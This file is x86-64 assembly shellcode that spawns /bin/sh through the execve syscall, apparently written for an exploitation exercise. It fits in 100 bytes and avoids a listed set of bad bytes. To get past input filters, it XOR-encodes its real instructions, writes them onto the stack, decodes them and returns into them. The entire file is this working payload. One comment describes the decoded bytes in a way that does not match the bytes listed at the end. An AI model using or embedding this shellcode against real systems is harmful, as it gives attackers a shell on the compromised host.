;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; exec "/bin/sh" in 100 bytes
; bad bytes: "00 0a 0d 2f ff 0f 05 68 40 ~ 81"

[BITS 64]

%define SYS_EXEC 59
%define XORKEY   0xfefefefe

[SECTION .TEXT]
	global _start

_start:
	; set [rsp] = rsp+0x0110
	pushf
	enter 0x0108, 1

	xor edx, edx
	xor ecx, ecx
	mov dh, 0x1
	mov dl, 0xc						; rdx = 0x010c
	mov cl, 0x4						; rcx = 0x4
	mov eax, [rsp+rdx]
	mov [rsp+rcx], eax
	mov dl, 0x8						; rdx = 0x0108
	mov eax, [rsp+rdx]
	mov [rsp], eax
	
	; write the codes and the data at rsp+0x0110
	mov dl, 0x10
	mov dword [rsp+rdx], 0x000008e8 ^ XORKEY
	mov dl, 0x14
	mov dword [rsp+rdx], 0x69622f00 ^ XORKEY
	mov dl, 0x18
	mov dword [rsp+rdx], 0x68732f6e ^ XORKEY
	mov dl, 0x1c
	mov dword [rsp+rdx], 0x050f5f00 ^ XORKEY

	mov ebx, XORKEY
	xor eax, eax
	mov al, 4
_xor:
	xor dword [rsp+rdx], ebx
	sub dl, al
	loop _xor

	; Now we have: [rsp] = rsp+0x0110
	;              [rsp+0x0110] = '48 8d 72 24 ....' (lea rdi, [rsp+7]....)
	; just a 'ret' will jump to rsp+0x0110

	; Before 'ret', set rax=SYS_EXEC, rdx=0, rsi=0
	mov al, SYS_EXEC
	xor edx, edx
	xor esi, esi

	; Step 3: do 'ret'.
	ret

_unreached:
	; the codes writed at rsp+0x0110
	; call _last					; e8 08 00 00 00
	; db "/bin/sh", 0				; 2f 62 69 6e 2f 73 68 00
	; _last: pop rdi				; 5f
	; syscall						; 0f 05
